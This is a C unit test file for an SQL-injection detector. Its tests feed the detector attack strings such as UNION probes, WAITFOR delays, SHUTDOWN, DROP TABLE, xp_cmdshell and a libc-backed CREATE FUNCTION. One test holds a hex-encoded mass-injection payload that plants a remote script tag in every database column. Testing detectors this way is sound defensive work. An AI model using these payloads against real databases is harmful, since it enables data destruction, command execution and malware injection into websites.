#include <CUnit/Basic.h>
#include <detect/detect.h>
#include <stdlib.h>

#define STR_LEN_ARGS(str) str, sizeof(str) - 1

static void
Tsimplest(void)
{
    CU_ASSERT_EQUAL(detect_init(), 0);
    CU_ASSERT_EQUAL(detect_deinit(), 0);
    CU_ASSERT_EQUAL(detect_init(), 0);
    CU_ASSERT_EQUAL(detect_deinit(), 0);
}

static int
s_sqli_suite_init(void)
{
    return (detect_init());
}

static int
s_sqli_suite_deinit(void)
{
    return (detect_deinit());
}

static void
Tsqli_simplest(void)
{
    struct detect *detect;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_rce(void)
{
    struct detect *detect;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("UP"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT SELECT"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    printf("Next!\n");
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("10 + 11 + 12 + 13"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_inj_in_table_name(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' where 1=1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_union_distinct(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' union distinct select 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_operators(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' RLIKE '.*'"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 MOD 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 XOR 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' REGEXP '.*'"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' + BINARY '1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1' INTO OUTFILE '1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 AND 1 SOUNDS LIKE 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 MATCH(col) AGAINST('text')"),
                        true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_begin_end(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1'; BEGIN UPDATE table_name SET column1 = value1 END"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_waitfor(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1'; WAITFOR DELAY '02:00'"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1'; WAITFOR TIME '02:00'"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_top(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT TOP 5 * FROM table_name"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_identifier_quote(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(detect_add_data(detect,
                                    STR_LEN_ARGS("SELECT * FROM `select`"),
                                    true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_whitespace(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1\vor\v1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1\u00A0or\u00A01"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_null(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1-\\N union select 1"), true),0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_left_func(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 AND left(a, 2) = 'ab'"), true),
        0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_func(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1; DBMS_LOCK.SLEEP()"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_var_start_with_dollar(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1 AND $func(a, 2) = 'ab'"), true),
        0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_create_func(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect,
                        STR_LEN_ARGS("1; CREATE OR REPLACE FUNCTION SLEEP(int) \
                                      RETURNS int AS '/lib/libc.so.6','sleep'  \
                                      language 'C' STRICT"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_bit_num(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("0b01UNION SELECT 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("B01UNION ALL SELECT 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("0b'01'UNION SELECT 1"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("B'01' UNION ALL SELECT 1"), true), 0);
}

static void
Tsqli_join_wo_join_qual(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
      detect_add_data(detect,
                      STR_LEN_ARGS("SELECT * FROM (SELECT * FROM (SELECT 1) \
                                    as t JOIN (SELECT 2)b)a"), true), 0);
  CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
  CU_ASSERT_EQUAL(detect_stop(detect), 0);
  CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_empty_schema(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT 1 FROM master..sysdatabases"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_asc_desc(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT 1 ORDER BY 1 ASC"), true),
        0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT 1 ORDER BY 1 DESC"), true),
        0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_shutdown(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1; SHUTDOWN"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_into_outfile(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect,
                        STR_LEN_ARGS("SELECT 1 FROM table_name INTO OUTFILE 1"),
                        true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_declare(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
          detect_add_data(detect, STR_LEN_ARGS("1; DECLARE name varchar(42)"),
                          true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_execute(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect,
                        STR_LEN_ARGS("EXEC master.dbo.xp_cmdshell 'cmd'"),
                        true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_nul_in_str(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("1\0' ^ '"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_drop(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("DROP TABLE table_name"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("DROP FUNCTION func_name"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_select_alias(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("(select 1) as t"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_where(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT * FROM (table_name)"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_string(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS(
            "SELECT _latin1 'str' COLLATE latin1_german2_ci a, n'str' b, "
            "x'str' c, _utf8'str' d"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_use(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("USE database"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_delete(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("DELETE LOW_PRIORITY \
            FROM table_name WHERE 1=1 ORDER BY col ASC LIMIT 42"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_buf(void)
{
    struct detect *detect;
    uint32_t attack_types;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect,
                        STR_LEN_ARGS("SELECT 0x4445434C415245204054207661726368"
                                     "617228323535292C4043207661726368617228343"
                                     "0303029204445434C415245205461626C655F4375"
                                     "72736F7220435552534F5220464F522073656C656"
                                     "37420612E6E616D652C622E6E616D652066726F6D"
                                     "207379736F626A6563747320612C737973636F6C7"
                                     "56D6E73206220776865726520612E69643D622E69"
                                     "6420616E6420612E78747970653D27752720616E6"
                                     "42028622E78747970653D3939206F7220622E7874"
                                     "7970653D3335206F7220622E78747970653D32333"
                                     "1206F7220622E78747970653D31363729204F5045"
                                     "4E205461626C655F437572736F722046455443482"
                                     "04E4558542046524F4D20205461626C655F437572"
                                     "736F7220494E544F2040542C4043205748494C452"
                                     "8404046455443485F5354415455533D3029204245"
                                     "47494E20657865632827757064617465205B272B4"
                                     "0542B275D20736574205B272B40432B275D3D2727"
                                     "223E3C2F7469746C653E3C7363726970742073726"
                                     "33D22687474703A2F2F777777302E646F7568756E"
                                     "716E2E636E2F63737273732F772E6A73223E3C2F7"
                                     "363726970743E3C212D2D27272B5B272B40432B27"
                                     "5D20776865726520272B40432B27206E6F74206C6"
                                     "96B6520272725223E3C2F7469746C653E3C736372"
                                     "697074207372633D22687474703A2F2F777777302"
                                     "E646F7568756E716E2E636E2F63737273732F772E"
                                     "6A73223E3C2F7363726970743E3C212D2D2727272"
                                     "94645544348204E4558542046524F4D2020546162"
                                     "6C655F437572736F7220494E544F2040542C40432"
                                     "0454E4420434C4F5345205461626C655F43757273"
                                     "6F72204445414C4C4F43415445205461626C655F4"
                                     "37572736F72"), true), 0);
    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

int
main(void)
{
    CU_TestInfo generic_tests[] = {
        {"simplest", Tsimplest},
        CU_TEST_INFO_NULL
    };
    CU_TestInfo sqli_tests[] = {
        {"simplest", Tsqli_simplest},
        {"rce", Tsqli_rce},
        {"inj_in_table_name", Tsqli_inj_in_table_name},
        {"union_distinct", Tsqli_union_distinct},
        {"operators", Tsqli_operators},
        {"begin_end", Tsqli_begin_end},
        {"waitfor", Tsqli_waitfor},
        {"top", Tsqli_top},
        {"identifier_quote", Tsqli_identifier_quote},
        {"whitespace", Tsqli_whitespace},
        {"null", Tsqli_null},
        {"left_func", Tsqli_left_func},
        {"func", Tsqli_func},
        {"var_start_with_dollar", Tsqli_var_start_with_dollar},
        {"create_func", Tsqli_create_func},
        {"bit_num", Tsqli_bit_num},
        {"join_wo_join_qual", Tsqli_join_wo_join_qual},
        {"empty_schema", Tsqli_empty_schema},
        {"asc_desc", Tsqli_asc_desc},
        {"shutdown", Tsqli_shutdown},
        {"into_outfile", Tsqli_into_outfile},
        {"declare", Tsqli_declare},
        {"execute", Tsqli_execute},
        {"nul_in_str", Tsqli_nul_in_str},
        {"select_alias", Tsqli_select_alias},
        {"drop", Tsqli_drop},
        {"where", Tsqli_where},
        {"string", Tsqli_string},
        {"use", Tsqli_use},
        {"delete", Tsqli_delete},
        {"buf", Tsqli_buf},
        CU_TEST_INFO_NULL
    };
    CU_SuiteInfo suites[] = {
        {.pName = "generic", .pTests = generic_tests},
        {.pName = "sqli", .pTests = sqli_tests,
         .pInitFunc = s_sqli_suite_init, .pCleanupFunc = s_sqli_suite_deinit},
        CU_SUITE_INFO_NULL,
    };
    CU_pRunSummary sum;

    if (CU_initialize_registry() != CUE_SUCCESS)
        return (EXIT_FAILURE);
    if (CU_register_suites(suites) != CUE_SUCCESS)
        return (EXIT_FAILURE);
    CU_basic_set_mode(CU_BRM_VERBOSE);
    CU_basic_run_tests();

    if ((sum = CU_get_run_summary()) == NULL ||
        sum->nSuitesFailed || sum->nTestsFailed || sum->nAssertsFailed) {

        CU_cleanup_registry();
        return (EXIT_FAILURE);
    }
    CU_cleanup_registry();
    return (EXIT_SUCCESS);
}
